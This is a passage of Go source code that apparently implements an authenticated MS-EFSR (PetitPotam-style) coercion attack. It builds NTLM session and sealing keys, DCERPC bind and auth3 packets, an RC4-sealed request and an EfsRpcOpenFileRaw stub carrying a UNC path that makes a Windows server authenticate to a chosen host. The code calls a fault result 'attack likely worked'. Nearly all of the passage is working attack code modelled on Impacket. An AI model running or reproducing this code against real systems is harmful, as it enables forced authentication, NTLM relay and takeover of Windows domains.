//   - sessionKey: 16-byte session key (typically exportedSessionKey after KEY_EXCH)
//   - client: true for client-to-server key, false for server-to-client
//
// Output: 16-byte sealing key (used to initialize RC4 cipher)
func calculateSealKey(sessionKey []byte, client bool) []byte {
	var magic string
	if client {
		magic = "session key to client-to-server sealing key magic constant\x00"
	} else {
		magic = "session key to server-to-client sealing key magic constant\x00"
	}
	h := md5.New()
	h.Write(sessionKey)
	h.Write([]byte(magic))
	return h.Sum(nil)
}

func buildTempBlob(timestamp int64, clientChallenge, targetInfo []byte) []byte {
	fmt.Printf("[DEBUG] buildTempBlob: targetInfo length=%d, last 50 bytes: %x\n", len(targetInfo), targetInfo[len(targetInfo)-50:])

	buf := new(bytes.Buffer)

	buf.WriteByte(0x01)                 // RespType
	buf.WriteByte(0x01)                 // HiRespType
	buf.Write([]byte{0, 0, 0, 0, 0, 0}) // Reserved

	binary.Write(buf, binary.LittleEndian, uint64(timestamp))
	buf.Write(clientChallenge)
	buf.Write([]byte{0, 0, 0, 0}) // Reserved
	buf.Write(targetInfo)
	buf.Write([]byte{0, 0, 0, 0}) // End

	return buf.Bytes()
}

func createMinimalTargetInfo() []byte {
	// Empty target info with terminator
	return []byte{0, 0, 0, 0}
}

// extractHostnameFromTargetInfo extracts the DNS or NetBIOS hostname from AV_PAIRS
func extractHostnameFromTargetInfo(targetInfo []byte) []byte {
	// Parse AV_PAIRS to find NTLMSSP_AV_HOSTNAME (0x0001) or NTLMSSP_AV_DNS_HOSTNAME (0x0003)
	offset := 0
	for offset+4 <= len(targetInfo) {
		avID := binary.LittleEndian.Uint16(targetInfo[offset : offset+2])
		avLen := binary.LittleEndian.Uint16(targetInfo[offset+2 : offset+4])
		offset += 4

		if avID == 0x0000 { // EOL
			break
		}

		if avID == 0x0001 || avID == 0x0003 { // HOSTNAME or DNS_HOSTNAME
			if offset+int(avLen) <= len(targetInfo) {
				hostname := make([]byte, avLen)
				copy(hostname, targetInfo[offset:offset+int(avLen)])
				fmt.Printf("[DEBUG] Extracted hostname from AV_PAIR 0x%04x: %d bytes\n", avID, avLen)
				return hostname
			}
		}

		offset += int(avLen)
	}
	return nil
}

// addTargetNameToAVPairs adds NTLMSSP_AV_TARGET_NAME (0x0009) to the AV_PAIRS
// Format: 'cifs/' + hostname (UTF-16LE)
func addTargetNameToAVPairs(targetInfo []byte, hostname []byte) []byte {
	// Parse existing AV_PAIRS and remove EOL marker (we'll add it back at the end)
	fmt.Printf("[DEBUG] Processing targetInfo (%d bytes)\n", len(targetInfo))
	filtered := new(bytes.Buffer)
	offset := 0
	for offset+4 <= len(targetInfo) {
		avID := binary.LittleEndian.Uint16(targetInfo[offset : offset+2])
		avLen := binary.LittleEndian.Uint16(targetInfo[offset+2 : offset+4])

		if avID == 0x0000 { // EOL - stop here, we'll add it back at the end
			break
		}

		// Keep ALL av_pairs from server (like Python does)
		filtered.Write(targetInfo[offset : offset+4+int(avLen)])
		fmt.Printf("[DEBUG] Including AV_PAIR 0x%04x (len=%d)\n", avID, avLen)

		offset += 4 + int(avLen)
	}
	targetInfo = filtered.Bytes()
	fmt.Printf("[DEBUG] After removing EOL: %d bytes\n", len(targetInfo))

	// Build TARGET_NAME: 'cifs/' + hostname
	cifsPrefix := stringToUTF16LE("cifs/")
	targetName := append(cifsPrefix, hostname...)

	fmt.Printf("[DEBUG] TARGET_NAME construction:\n")
	fmt.Printf("  cifs/ prefix: %d bytes\n", len(cifsPrefix))
	fmt.Printf("  hostname: %d bytes\n", len(hostname))
	fmt.Printf("  total TARGET_NAME: %d bytes\n", len(targetName))

	// Add TARGET_NAME AV_PAIR
	buf := new(bytes.Buffer)
	buf.Write(targetInfo)
	binary.Write(buf, binary.LittleEndian, uint16(0x0009)) // NTLMSSP_AV_TARGET_NAME
	binary.Write(buf, binary.LittleEndian, uint16(len(targetName)))
	buf.Write(targetName)

	// Add EOL
	binary.Write(buf, binary.LittleEndian, uint16(0x0000))
	binary.Write(buf, binary.LittleEndian, uint16(0x0000))

	return buf.Bytes()
}

func stringToUTF16LE(s string) []byte {
	runes := []rune(s)
	u16 := utf16.Encode(runes)
	buf := new(bytes.Buffer)
	for _, r := range u16 {
		binary.Write(buf, binary.LittleEndian, r)
	}
	return buf.Bytes()
}

func uppercaseString(s string) string {
	// Simple uppercase (for ASCII)
	runes := []rune(s)
	for i, r := range runes {
		if r >= 'a' && r <= 'z' {
			runes[i] = r - 32
		}
	}
	return string(runes)
}

// DCERPC packet creation functions

func createDCERPCBindWithAuth(negotiateMsg []byte) []byte {
	buf := new(bytes.Buffer)

	// DCERPC Header
	buf.WriteByte(5)                                      // Version major
	buf.WriteByte(0)                                      // Version minor
	buf.WriteByte(dcerpcBind)                             // Packet type
	buf.WriteByte(dcerpcPfcFirstFrag | dcerpcPfcLastFrag) // Flags
	binary.Write(buf, binary.LittleEndian, uint32(0x10))  // Data representation

	fragLenPos := buf.Len()
	binary.Write(buf, binary.LittleEndian, uint16(0))                 // Frag length (update later)
	binary.Write(buf, binary.LittleEndian, uint16(len(negotiateMsg))) // Auth length
	binary.Write(buf, binary.LittleEndian, uint32(1))                 // Call ID

	// Bind body (use Impacket's values)
	binary.Write(buf, binary.LittleEndian, uint16(4280)) // Max xmit frag
	binary.Write(buf, binary.LittleEndian, uint16(4280)) // Max recv frag
	binary.Write(buf, binary.LittleEndian, uint32(0))    // Assoc group

	// Context list
	buf.WriteByte(1) // Num contexts
	buf.WriteByte(0) // Reserved
	buf.WriteByte(0) // Reserved2
	buf.WriteByte(0) // Reserved3

	// Context item 0
	binary.Write(buf, binary.LittleEndian, uint16(0)) // Context ID
	buf.WriteByte(1)                                  // Num transfer syntaxes
	buf.WriteByte(0)                                  // Reserved

	// Abstract syntax (MS-EFSR)
	efsrUUID := parseUUID(msEfsrUUID)
	buf.Write(efsrUUID)
	binary.Write(buf, binary.LittleEndian, uint16(msEfsrMajorVersion))
	binary.Write(buf, binary.LittleEndian, uint16(msEfsrMinorVersion))

	// Transfer syntax (NDR)
	transferUUID := parseUUID(ndrUUID)
	buf.Write(transferUUID)
	binary.Write(buf, binary.LittleEndian, uint16(2))
	binary.Write(buf, binary.LittleEndian, uint16(0))

	// Pad to 4-byte boundary (Impacket does this)
	currentLen := buf.Len()
	padLen := (4 - (currentLen % 4)) % 4
	for i := 0; i < padLen; i++ {
		buf.WriteByte(0xFF) // Impacket uses 0xFF for padding
	}

	// Auth verifier header
	buf.WriteByte(dcerpcAuthTypeNTLMSSP)                    // Auth type
	buf.WriteByte(dcerpcAuthLevelPrivacy)                   // Auth level
	buf.WriteByte(byte(padLen))                             // Auth pad length
	buf.WriteByte(0)                                        // Reserved
	binary.Write(buf, binary.LittleEndian, uint32(0+79231)) // Auth context ID (like Impacket)

	// Auth value (NTLM Negotiate)
	buf.Write(negotiateMsg)

	// Update frag length
	packet := buf.Bytes()
	binary.LittleEndian.PutUint16(packet[fragLenPos:], uint16(len(packet)))

	return packet
}

func createDCERPCAuth3(auth *NTLMAuth, authenticateMsg []byte) []byte {
	buf := new(bytes.Buffer)

	// DCERPC Header
	buf.WriteByte(5)                                      // Version major
	buf.WriteByte(0)                                      // Version minor
	buf.WriteByte(dcerpcAuth3)                            // Packet type: Auth3
	buf.WriteByte(dcerpcPfcFirstFrag | dcerpcPfcLastFrag) // Flags
	binary.Write(buf, binary.LittleEndian, uint32(0x10))  // Data representation

	fragLenPos := buf.Len()
	binary.Write(buf, binary.LittleEndian, uint16(0))                    // Frag length (update later)
	binary.Write(buf, binary.LittleEndian, uint16(len(authenticateMsg))) // Auth length
	binary.Write(buf, binary.LittleEndian, uint32(1))                    // Call ID

	// Auth3 requires 4 bytes of padding before the auth trailer (per MS-RPCE spec)
	buf.Write([]byte{0, 0, 0, 0}) // 4 bytes padding

	// Auth verifier header (8 bytes)
	buf.WriteByte(dcerpcAuthTypeNTLMSSP)                       // Auth type
	buf.WriteByte(dcerpcAuthLevelPrivacy)                      // Auth level
	buf.WriteByte(0)                                           // Auth pad length
	buf.WriteByte(0)                                           // Reserved
	binary.Write(buf, binary.LittleEndian, auth.authContextID) // Auth context ID from server

	// Auth value (NTLM Authenticate)
	buf.Write(authenticateMsg)

	// Update frag length
	packet := buf.Bytes()
	binary.LittleEndian.PutUint16(packet[fragLenPos:], uint16(len(packet)))

	return packet
}

func sendAuthenticatedEfsRpc(pipe *smb.File, auth *NTLMAuth, uncPath string, opnum uint16) error {
	// Create stub (same structure for both opnum 0 and opnum 4)
	stub := createEfsRpcOpenFileRawStub(uncPath)
	fmt.Printf("[DEBUG] Stub (%d bytes): %x\n", len(stub), stub)

	// Create DCERPC Request with auth verifier
	req := createAuthenticatedRequest(auth, opnum, stub)
	truncLen := 80
	if len(req) < truncLen {
		truncLen = len(req)
	}
	fmt.Printf("[DEBUG] Authenticated request (%d bytes): %x...\n", len(req), req[:truncLen])

	// Use WritePipe/ReadPipe (like impacket does)
	fmt.Println("[+] Sending authenticated request via WritePipe...")
	_, err := pipe.WritePipe(req)
	if err != nil {
		return fmt.Errorf("request write failed: %v", err)
	}

	// Read response
	resp := make([]byte, 4096)
	nResp, err := pipe.ReadPipe(resp)
	if err != nil {
		return fmt.Errorf("request read failed: %v", err)
	}
	resp = resp[:nResp]
	fmt.Printf("[DEBUG] Request sent, got %d bytes response: %x\n", len(resp), resp)
	if len(resp) >= 24 && resp[2] == dcerpcFault {
		status := binary.LittleEndian.Uint32(resp[24:28])
		if status == 0x6f7 {
			return fmt.Errorf("got ERROR_BAD_NETPATH (0x%x) - attack likely worked", status)
		}
		return fmt.Errorf("got fault 0x%x", status)
	}

	return nil
}

// createAuthenticatedRequest creates a DCERPC Request packet with PKT_PRIVACY encryption
//
// CRITICAL ENCRYPTION ORDER (matches impacket's SEAL function):
//
// This is the most subtle and critical part of DCERPC PKT_PRIVACY implementation.
// The order MUST be:
//  1. Build packet with PLAINTEXT stub + padding
//  2. Encrypt stub+padding with RC4 (but DON'T write to packet yet)
//  3. Sign packet with PLAINTEXT stub (signature encrypts checksum with CONTINUED RC4 stream)
//  4. Replace plaintext stub with encrypted stub in packet
//
// WHY THIS ORDER MATTERS:
// - The RC4 cipher is a CONTINUOUS STREAM (never reset)
// - Stub encryption uses bytes 0..N of the RC4 keystream
// - Signature checksum encryption uses bytes N+1..N+8 of the SAME keystream
// - If you sign first, then encrypt stub, the RC4 stream gets out of sync
// - Server will decrypt with wrong keystream bytes and fail
//
// This matches impacket's ntlm.SEAL() which does:
//  1. encrypted_pdu = cipher_encrypt(plain_pdu)
//  2. signature = GSS_GetMIC(plain_pdu)  # Uses continued RC4 for checksum
//
// Input:
//   - auth: NTLMAuth state with continuous RC4 cipher handle
//   - opnum: DCERPC operation number (0 = EfsRpcOpenFileRaw, 4 = EfsRpcEncryptFileSrv)
//   - stub: NDR-encoded function parameters (typically UNC path for EfsRpc)
//
// Output: Complete DCERPC Request packet with encrypted stub and signature
func createAuthenticatedRequest(auth *NTLMAuth, opnum uint16, stub []byte) []byte {

	// Use current sequence number (starts at 0 like impacket)
	fmt.Printf("[DEBUG] Using sequence number: %d for authenticated request\n", auth.seqNum)

	buf := new(bytes.Buffer)

	// DCERPC Header
	buf.WriteByte(5)                                      // Version major
	buf.WriteByte(0)                                      // Version minor
	buf.WriteByte(dcerpcRequest)                          // Packet type
	buf.WriteByte(dcerpcPfcFirstFrag | dcerpcPfcLastFrag) // Flags
	binary.Write(buf, binary.LittleEndian, uint32(0x10))  // Data representation

	fragLenPos := buf.Len()
	binary.Write(buf, binary.LittleEndian, uint16(0))  // Frag length (update later)
	binary.Write(buf, binary.LittleEndian, uint16(16)) // Auth length (NTLM signature is always 16 bytes)
	binary.Write(buf, binary.LittleEndian, uint32(2))  // Call ID

	// Calculate padding needed for 4-byte alignment (impacket uses 4-byte, not 8-byte!)
	// Padding is added to the stub BEFORE encryption
	stubPadLength := (4 - (len(stub) % 4)) % 4

	// Request body - impacket sets alloc_hint to stub length (before padding)
	binary.Write(buf, binary.LittleEndian, uint32(len(stub))) // Alloc hint = stub length before padding
	binary.Write(buf, binary.LittleEndian, uint16(0))         // Context ID
	binary.Write(buf, binary.LittleEndian, uint16(opnum))     // Opnum
	fmt.Printf("[DEBUG] DCERPC Request: ContextID=%d, Opnum=%d, StubLen=%d (padded=%d), alloc_hint=%d\n", 0, opnum, len(stub), len(stub)+stubPadLength, len(stub))

	// PLAINTEXT stub with padding (will be encrypted together)
	stubStartPos := buf.Len()

	// Create padded stub (impacket uses 0xBB for padding bytes)
	paddedStub := make([]byte, len(stub)+stubPadLength)
	copy(paddedStub, stub)
	for i := 0; i < stubPadLength; i++ {
		paddedStub[len(stub)+i] = 0xBB
	}

	// Write padded stub (padding is already included in paddedStub)
	buf.Write(paddedStub)

	// The stubPadLength IS the auth_pad_len! No additional padding needed
	// Impacket adds the padding to pduData and sets auth_pad_len to that same value

	// Auth verifier header
	buf.WriteByte(dcerpcAuthTypeNTLMSSP)                       // Auth type
	buf.WriteByte(dcerpcAuthLevelPrivacy)                      // Auth level
	buf.WriteByte(byte(stubPadLength))                         // Auth pad length (matches stub padding!)
	buf.WriteByte(0)                                           // Reserved
	binary.Write(buf, binary.LittleEndian, auth.authContextID) // Auth context ID

	// Placeholder for signature (16 bytes)
	signaturePos := buf.Len()
	buf.Write(make([]byte, 16))

	// Update frag length
	packet := buf.Bytes()
	binary.LittleEndian.PutUint16(packet[fragLenPos:], uint16(len(packet)))

	// ========== CRITICAL ENCRYPTION/SIGNING SECTION ==========
	//
	// The order of these operations is CRITICAL for compatibility with Windows.
	// Must match impacket's SEAL function exactly.

	// Message to sign = entire packet EXCEPT the 16-byte signature placeholder
	// At this point, packet contains PLAINTEXT stub
	messageToSign := packet[:len(packet)-16]

	// STEP 1: Encrypt stub+padding with RC4 cipher
	// This uses bytes 0..N of the RC4 keystream
	// IMPORTANT: We encrypt but DON'T write to packet yet!
	encryptedStub := make([]byte, len(paddedStub))
	auth.clientSealHandle.XORKeyStream(encryptedStub, paddedStub)

	// STEP 2: Create NTLM signature from PLAINTEXT packet
	// The signature function will:
	//   a) Calculate HMAC-MD5 checksum of messageToSign (which has PLAINTEXT stub)
	//   b) Encrypt the first 8 bytes of checksum with RC4
	//   c) This RC4 encryption uses bytes N+1..N+8 of the CONTINUED keystream
	// This is why order matters - signature must use the continued stream after stub encryption
	verifier := createNTLMSignature(auth, messageToSign)

	// STEP 3: Replace plaintext stub with encrypted stub in packet
	// Now the packet has encrypted stub and valid signature
	copy(packet[stubStartPos:], encryptedStub)

	// STEP 4: Copy signature into packet
	copy(packet[signaturePos:], verifier)

	// Increment sequence number AFTER using it (like impacket)
	auth.seqNum++

	return packet
}

func createNTLMSignature(auth *NTLMAuth, message []byte) []byte {
	// Create NTLM signature for the message using continuous RC4 cipher handle
	// For extended session security: sign whole packet, encrypt just the checksum

	// Compute HMAC-MD5 checksum over the message (whole DCERPC packet except signature)
	h := hmac.New(md5.New, auth.clientSignKey)
	seqNumBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(seqNumBytes, auth.seqNum)
	h.Write(seqNumBytes)
	h.Write(message)
	checksum := h.Sum(nil)[:8] // First 8 bytes

	// Encrypt checksum using the continuous RC4 cipher handle
	encryptedChecksum := make([]byte, 8)
	auth.clientSealHandle.XORKeyStream(encryptedChecksum, checksum)

	// Build signature: Version (4 bytes) + Encrypted Checksum (8 bytes) + SeqNum (4 bytes)
	buf := new(bytes.Buffer)
	binary.Write(buf, binary.LittleEndian, uint32(1)) // Version
	buf.Write(encryptedChecksum)
	binary.Write(buf, binary.LittleEndian, uint32(auth.seqNum))

	return buf.Bytes()
}

/*func encryptStub(auth *NTLMAuth, stub []byte) []byte {
	// Derive per-message sealing key: MD5(SealingKey || SeqNum)
	seqNumBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(seqNumBytes, auth.seqNum)
	m := md5.New()
	m.Write(auth.clientSealKey)
	m.Write(seqNumBytes)
	perMessageKey := m.Sum(nil)

	// Encrypt stub with RC4 using per-message seal key
	cipher, _ := rc4.NewCipher(perMessageKey)
	encrypted := make([]byte, len(stub))
	cipher.XORKeyStream(encrypted, stub)
	return encrypted
}*/

func createEfsRpcOpenFileRawStub(uncPath string) []byte {
	var buf bytes.Buffer

	// Convert to UTF-16LE
	utf16Path := stringToUTF16LE(uncPath)
	lenChars := uint32(len([]rune(uncPath)))

	// Max count
	binary.Write(&buf, binary.LittleEndian, lenChars)
	// Offset
	binary.Write(&buf, binary.LittleEndian, uint32(0))
	// Actual count
	binary.Write(&buf, binary.LittleEndian, lenChars)

	// String data
	buf.Write(utf16Path)

	// Padding to 4-byte boundary (NDR uses 0x00 for padding)
	totalSoFar := 12 + len(utf16Path)
	padding := (4 - (totalSoFar % 4)) % 4
	for i := 0; i < padding; i++ {
		buf.WriteByte(0x00)
	}

	// Flags parameter
	binary.Write(&buf, binary.LittleEndian, uint32(0))

	return buf.Bytes()
}

// parseUUID and other helper functions...

func parseUUID(uuidStr string) []byte {
	decoded, _ := hex.DecodeString(uuidStr[0:8] + uuidStr[9:13] + uuidStr[14:18] + uuidStr[19:23] + uuidStr[24:36])
	uuid := make([]byte, 16)
	uuid[0], uuid[1], uuid[2], uuid[3] = decoded[3], decoded[2], decoded[1], decoded[0]
	uuid[4], uuid[5] = decoded[5], decoded[4]
	uuid[6], uuid[7] = decoded[7], decoded[6]
	copy(uuid[8:], decoded[8:])
	return uuid
}
